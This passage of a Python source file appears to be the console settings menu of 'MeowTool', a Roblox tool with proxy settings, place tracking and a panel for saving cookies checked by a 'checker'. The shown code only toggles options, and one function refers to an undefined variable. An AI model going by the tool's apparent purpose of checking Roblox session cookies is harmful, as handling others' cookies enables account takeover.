f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} socks5\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                                    settingsTAProxyAutoProtocolTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                                    match settingsTAProxyAutoProtocolTab.upper():
                                                                        case '1':
                                                                            config['Roblox']['TransactionAnalysis']['Proxy']['Auto_Protocol_If_Not_Specified'] = 'http'
                                                                        case '2':
                                                                            config['Roblox']['TransactionAnalysis']['Proxy']['Auto_Protocol_If_Not_Specified'] = 'socks4'
                                                                        case '3':
                                                                            config['Roblox']['TransactionAnalysis']['Proxy']['Auto_Protocol_If_Not_Specified'] = 'socks5'
                                                                        case '0':
                                                                            whileTrueStage5 = False
                                                                        case 'F' | 'А':
                                                                            await cls()
                                                                            await lableASCII()
                                                                        case 'R' | 'К':
                                                                            loadConfig(configLoader['Loader']['Current_Config'])
                                                                        case _:
                                                                            await removeLines(9)

                                                                    await autoSaveConfigAndRemoveLinesInSettings(settingsTAProxyAutoProtocolTab.upper(), ('1', '2', '3'), ('0', 'R', 'К'), 9)
                                                            case '0':
                                                                whileTrueStage4 = False
                                                            case 'F' | 'А':
                                                                await cls()
                                                                await lableASCII()
                                                            case 'R' | 'К':
                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                            case _:
                                                                await removeLines(10)

                                                        await autoSaveConfigAndRemoveLinesInSettings(settingsTAProxyTab.upper(), ('1'), ('0', 'R', 'К'), 10)
                                                case '3':
                                                    whileTrueStage4 = True
                                                    await removeLines(9)
                                                    while whileTrueStage4:
                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_Places}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n\n')
                                                        await printTAPlaces()
                                                        sys.stdout.write(f'{f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Disable_All}\n  ┃\n' if config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places'] else ''} [{ANSI.FG.YELLOW}A{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Add_A_Place_By_ID}\n [{ANSI.FG.YELLOW}S{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['TransactionAnalysis']['Places']['Show_Game_ID_Next_To_The_Name'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Show_Place_ID_Next_To_The_Name}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                        settingsTAPlacesTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                        if settingsTAPlacesTab == '0': whileTrueStage4 = False
                                                        elif settingsTAPlacesTab.isdigit() and int(settingsTAPlacesTab) <= len(config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places']):
                                                            await TAPlaceContextMenu(int(settingsTAPlacesTab) - 1)
                                                        elif settingsTAPlacesTab.upper() in ('A', 'Ф'):
                                                            await cls()
                                                            await lableASCII()
                                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_Places}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Cancel}{ANSI.CLEAR}\n\n')
                                                            settingsTAPlaceAdd = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_The_Place_ID}:{ANSI.CLEAR} ')

                                                            async def addPlace():
                                                                if settingsTAPlaceAdd == '0': return
                                                                if not settingsTAPlaceAdd.isdigit():
                                                                    return await errorOrCorrectHandler(True, 5, MT_Incorrent_Place_ID,                f'{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_Places}')
                                                                if len(settingsTAPlaceAdd) > 50:
                                                                    return await errorOrCorrectHandler(True, 5, MT_Incorrect_Length_Of_ID_50,         f'{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_Places}')
                                                                if int(settingsTAPlaceAdd) in config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places']:
                                                                    return await errorOrCorrectHandler(True, 5, MT_Place_With_This_ID_Already_Exists, f'{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_Places}')

                                                                universeId = requests.get(f'https://apis.roblox.com/universes/v1/places/{settingsTAPlaceAdd}/universe').json()['universeId']

                                                                if universeId == None:
                                                                    return await errorOrCorrectHandler(True, 5, MT_Incorrent_Place_ID,                f'{MT_Settings}\\{MT_Roblox}\\{MT_Transaction_Analysis}\\{MT_Places}')

                                                                placeInfo = requests.get(f'https://games.roblox.com/v1/games?universeIds={universeId}').json()

                                                                normalPlaceName = await removeEmojies(await removeSpecialChars(await removeBracketsAndIn(placeInfo['data'][0]['name'], True, True))).strip()
                                                                if not normalPlaceName:
                                                                    normalPlaceName = f'Unknown_{settingsRCCCustomPlaceAdd}'

                                                                config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places'].append(int(settingsTAPlaceAdd))
                                                                config['Roblox']['TransactionAnalysis']['Places'][settingsTAPlaceAdd] = [int(settingsTAPlaceAdd), [normalPlaceName, placeInfo['data'][0]['name']], False, False, False]
                                                                config['Roblox']['TransactionAnalysis']['Places'][f'{settingsTAPlaceAdd}_Ignore_List'] = []
                                                                await autoSaveConfig()

                                                            await addPlace()
                                                        elif settingsTAPlacesTab in ('+', '='):
                                                            for place in config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places']:
                                                                try: config['Roblox']['TransactionAnalysis']['Places'][str(place)][2] = True
                                                                except Exception: pass
                                                            await autoSaveConfig()
                                                        elif settingsTAPlacesTab in ('-', '_'):
                                                            for place in config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places']:
                                                                try: config['Roblox']['TransactionAnalysis']['Places'][str(place)][2] = False
                                                                except Exception: pass
                                                            await autoSaveConfig()
                                                        elif settingsTAPlacesTab.upper() in ('S', 'Ы'):
                                                            config['Roblox']['TransactionAnalysis']['Places']['Show_Game_ID_Next_To_The_Name'] ^= True
                                                            await autoSaveConfig()

                                                        await cls()
                                                        await lableASCII()
                                                case '0':
                                                    whileTrueStage3 = False
                                                    await removeLines(9)
                                                case 'F' | 'А':
                                                    await cls()
                                                    await lableASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                    await removeLines(9)
                                                case _:
                                                    await removeLines(9)
                                    # Панель управления куком
                                    case '6':
                                        whileTrueStage3 = True
                                        await removeLines(13)
                                        while whileTrueStage3:
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Cookie_Control_Panel}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieControlPanel']['Use_SSL'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Use_SSL}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieControlPanel']['Save_Cookies_Added_Manually'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Save_Cookies_Added_Manually}\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['CookieControlPanel']['Save_Cookies_Checked_By_Checker'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Save_Cookies_Checked_By_Checker}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                            settingsCookieControlPanelTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                            match settingsCookieControlPanelTab.upper():
                                                case '1':
                                                    config['Roblox']['CookieControlPanel']['Use_SSL'] ^= True
                                                case '2':
                                                    config['Roblox']['CookieControlPanel']['Save_Cookies_Added_Manually'] ^= True
                                                case '3':
                                                    config['Roblox']['CookieControlPanel']['Save_Cookies_Checked_By_Checker'] ^= True
                                                case '0':
                                                    whileTrueStage3 = False
                                                case 'F' | 'А':
                                                    await cls()
                                                    await lableASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                case _:
                                                    await removeLines(9)

                                            await autoSaveConfigAndRemoveLinesInSettings(settingsCookieControlPanelTab.upper(), ('1', '2', '3'), ('0', 'R', 'К'), 9)
                                    # Разное
                                    case '7':
                                        whileTrueStage3 = True
                                        await removeLines(13)
                                        while whileTrueStage3:
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Misc}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Gamepasses_Parser_From_The_Place}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Badges_Parser_From_The_Place}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                            settingsRobloxMiscTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                            match settingsRobloxMiscTab.upper():
                                                case '1':
                                                    whileTrueStage4 = True
                                                    await removeLines(8)
                                                    while whileTrueStage4:
                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Misc}\\{MT_Gamepasses_Parser_From_The_Place}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['Misc']['GamepassesParser']['Remove_Emojies_From_Name'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Remove_Emojies}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['Misc']['GamepassesParser']['Remove_Round_Brackets_And_In_From_Name'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Remove_Round_Brackets}\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['Misc']['GamepassesParser']['Remove_Square_Brackets_And_In_From_Name'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Remove_Square_Brackets}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                        miscRobloxGamepassesParserTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                        match miscRobloxGamepassesParserTab.upper():
                                                            case '1':
                                                                config['Roblox']['Misc']['GamepassesParser']['Remove_Emojies_From_Name'] ^= True
                                                            case '2':
                                                                config['Roblox']['Misc']['GamepassesParser']['Remove_Round_Brackets_And_In_From_Name'] ^= True
                                                            case '3':
                                                                config['Roblox']['Misc']['GamepassesParser']['Remove_Square_Brackets_And_In_From_Name'] ^= True
                                                            case '0':
                                                                whileTrueStage4 = False
                                                            case 'F' | 'А':
                                                                await cls()
                                                                await lableASCII()
                                                            case 'R' | 'К':
                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                            case _:
                                                                await removeLines(9)

                                                        await autoSaveConfigAndRemoveLinesInSettings(miscRobloxGamepassesParserTab.upper(), ('1', '2', '3'), ('0', 'R', 'К'), 9)
                                                case '2':
                                                    whileTrueStage4 = True
                                                    await removeLines(8)
                                                    while whileTrueStage4:
                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Roblox}\\{MT_Misc}\\{MT_Badges_Parser_From_The_Place}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['Misc']['BadgesParser']['Remove_Emojies_From_Name'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Remove_Emojies}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['Misc']['BadgesParser']['Remove_Round_Brackets_And_In_From_Name'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Remove_Round_Brackets}\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['Misc']['BadgesParser']['Remove_Square_Brackets_And_In_From_Name'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Remove_Square_Brackets}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                                        miscRobloxBadgesParserTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                                        match miscRobloxBadgesParserTab.upper():
                                                            case '1':
                                                                config['Roblox']['Misc']['BadgesParser']['Remove_Emojies_From_Name'] ^= True
                                                            case '2':
                                                                config['Roblox']['Misc']['BadgesParser']['Remove_Round_Brackets_And_In_From_Name'] ^= True
                                                            case '3':
                                                                config['Roblox']['Misc']['BadgesParser']['Remove_Square_Brackets_And_In_From_Name'] ^= True
                                                            case '0':
                                                                whileTrueStage4 = False
                                                            case 'F' | 'А':
                                                                await cls()
                                                                await lableASCII()
                                                            case 'R' | 'К':
                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                            case _:
                                                                await removeLines(9)

                                                        await autoSaveConfigAndRemoveLinesInSettings(miscRobloxBadgesParserTab.upper(), ('1', '2', '3'), ('0', 'R', 'К'), 9)
                                                case '0':
                                                    whileTrueStage3 = False
                                                    await removeLines(8)
                                                case 'F' | 'А':
                                                    await cls()
                                                    await lableASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                    await removeLines(8)
                                                case _:
                                                    await removeLines(8)
                                    case '0':
                                        whileTrueStage2 = False
                                        await removeLines(13)
                                    case 'F' | 'А':
                                        await cls()
                                        await lableASCII()
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                        await removeLines(13)
                                    case _:
                                        await removeLines(13)
                        # Настройки - Конфиги
                        case '4':
                            whileTrueStage2 = True
                            await removeLines(10)
                            while whileTrueStage2:
                                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Configs}\n\n')
                                printConfigs(configFiles())
                                sys.stdout.write(f'{ANSI.DECOR.BOLD}  ┃\n [{ANSI.FG.YELLOW}U{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Update_List}\n [{ANSI.FG.YELLOW}R{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Reload_Config} ({MT_Bind}: R)\n [{ANSI.FG.YELLOW}S{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if configLoader['Saver']['Auto_Save_Changes'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Auto_Save_Changes}\n [{ANSI.FG.YELLOW}C{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Create_Config}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                configsTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                if configsTab == '0': whileTrueStage2 = False
                                elif configsTab.isdigit() and int(configsTab) <= len(configFiles()):
                                    await configContextMenu(int(configsTab) - 1)
                                elif configsTab.upper() in ('C', 'С'):
                                    await cls()
                                    await lableASCII()

                                    nameOfNewConfig = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Settings}\\{MT_Configs}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Cancel}\n\n [{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Name_For_New_Config}:{ANSI.CLEAR} ')
                                    
                                    async def createConfig():
                                        if nameOfNewConfig == '0': return
                                        if len(nameOfNewConfig) > 100:
                                            return await errorOrCorrectHandler(True, 5, MT_Incorrect_Length_Of_Config_Name_50, f'{MT_Settings}\\{MT_Configs}')
                                        if nameOfNewConfig.lower() in {str(file).lower() for file in configFiles()}:
                                            return await errorOrCorrectHandler(True, 5, MT_File_With_This_Name_Already_Exists, f'{MT_Settings}\\{MT_Configs}')
                                        if any(char in nameOfNewConfig for char in ['\\', '/', ':', '*', '?', '"', '<', '>', '|']):
                                            return await errorOrCorrectHandler(True, 5, MT_Incorrect_File_Name,                f'{MT_Settings}\\{MT_Configs}')

                                        copyfile(f'Settings\\Configs\\{configLoader['Loader']['Current_Config']}.toml', f'Settings\\Configs\\{nameOfNewConfig}.toml')
                                        loadConfig(nameOfNewConfig)
                                        await autoSaveConfig()

                                    await createConfig()
                                elif configsTab.upper() in ('S', 'Ы'):
                                    configLoader['Saver']['Auto_Save_Changes'] ^= True
                                    open(f'Settings\\Configs\\.Loader.toml', 'w', encoding='UTF-8').write(dumps(configLoader))
                                elif configsTab.upper() in ('R', 'К'):
                                    loadConfig(configLoader['Loader']['Current_Config'])

                                await cls()
                                await lableASCII()
                        case '0':
                            whileTrueStage1 = False
                            await removeLines(10)
                        case 'F' | 'А':
                            await cls()
                            await lableASCII()
                        case 'R' | 'К':
                            loadConfig(configLoader['Loader']['Current_Config'])
                            await removeLines(10)
                        case _:
                            await removeLines(10)
            # О программе
            case 'i' | 'I' | 'ш'| 'Ш':
                whileTrueStage1 = True
                await removeLines(amountRemoveLines)
                while whileTrueStage1:
                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_About_The_Program}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_You_Are_Using_Version_Of_Program}\n [{ANSI.FG.PINK}U{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Open_Latest_Changes}\n [{ANSI.FG.PINK}G{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Open_MeowTool_On_GitHub}\n [{ANSI.FG.PINK}L{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Open_A_Topic_On_LolzTeam}\n [{ANSI.FG.PINK}Y{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Open_The_Showcase_On_YouTube}\n [{ANSI.FG.PINK}T{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Open_PM_With_Developer_In_Telegram} (@L1feeK)\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                    aboutTheProgramTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                    match aboutTheProgramTab.upper():
                        case 'U' | 'Г':
                            await openLink(f'https://github.com/h1kken/MeowTool/blob/meow/Changelog.md#{VERSIONS['MeowTool'].replace('.', '')}', MT_About_The_Program, 12)
                        case 'G' | 'П':
                            await openLink('https://github.com/h1kken/MeowTool',                                                                 MT_About_The_Program, 12)
                        case 'L' | 'Д':
                            await openLink('https://lolz.live/threads/8858338',                                                                  MT_About_The_Program, 12)
                        case 'Y' | 'Н':
                            await openLink('https://www.youtube.com/live/S_BODxV5vXk',                                                           MT_About_The_Program, 12)
                        case 'T' | 'Е':
                            await openLink('https://t.me/L1feeK',                                                                                MT_About_The_Program, 12)
                        case '0':
                            whileTrueStage1 = False
                        case 'F' | 'А':
                            await cls()
                            await lableASCII()
                        case 'R' | 'К':
                            loadConfig(configLoader['Loader']['Current_Config'])
                        case _:
                            await removeLines(12)

                    await autoSaveConfigAndRemoveLinesInSettings(aboutTheProgramTab.upper(), (), ('0', 'R', 'К'), 12)
            case 'Meow':
                await errorOrCorrectHandler(False, amountRemoveLines, 'Meow :3', 'Hewhewhew~')
            # Закрыть программу
            case '0':
                if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                    whileTrueStage1 = True
                    await removeLines(amountRemoveLines)
                    while whileTrueStage1:
                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}?{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Do_You_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_I_Am_Sure}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n [{ANSI.FG.RED}N{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Not_Yet}{ANSI.CLEAR}\n\n')
                        confirmTheAction = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                        match confirmTheAction.upper():
                            case 'Y' | 'Н':
                                sys.exit()
                            case 'N' | 'Т':
                                whileTrueStage1 = False

                        await removeLines(8)
                else:
                    sys.exit()
            case 'F' | 'А':
                await cls()
                await lableASCII()
            case 'R' | 'К':
                loadConfig(configLoader['Loader']['Current_Config'])
                await removeLines(amountRemoveLines)
            case _:
                await removeLines(amountRemoveLines)

if __name__ == '__main__':
    sys.stdout.write(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}<3{ANSI.CLEAR + ANSI.DECOR.BOLD}] Настраиваемся к комфорту и уюту... :3{ANSI.CLEAR}\r')
    if sys.platform == 'win32': asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    sys.stdout.write(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}<3{ANSI.CLEAR + ANSI.DECOR.BOLD}] Сортируем папки по полочкам... :3    {ANSI.CLEAR}\r')
    createFoldersAndFiles()
    sys.stdout.write(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}<3{ANSI.CLEAR + ANSI.DECOR.BOLD}] Мило просим у конфига настройки... :3{ANSI.CLEAR}\r')
    asyncio.run(loadConfigLoader())
    sys.stdout.write(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}<3{ANSI.CLEAR + ANSI.DECOR.BOLD}] Надеемся на честность переводов... :3{ANSI.CLEAR}\r')
    translateMT(config['General']['Language'])
    sys.stdout.write(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}<3{ANSI.CLEAR + ANSI.DECOR.BOLD}] Почти готово, ещё парочку часов... :3{ANSI.CLEAR}\r')
    asyncio.run(mainMenu())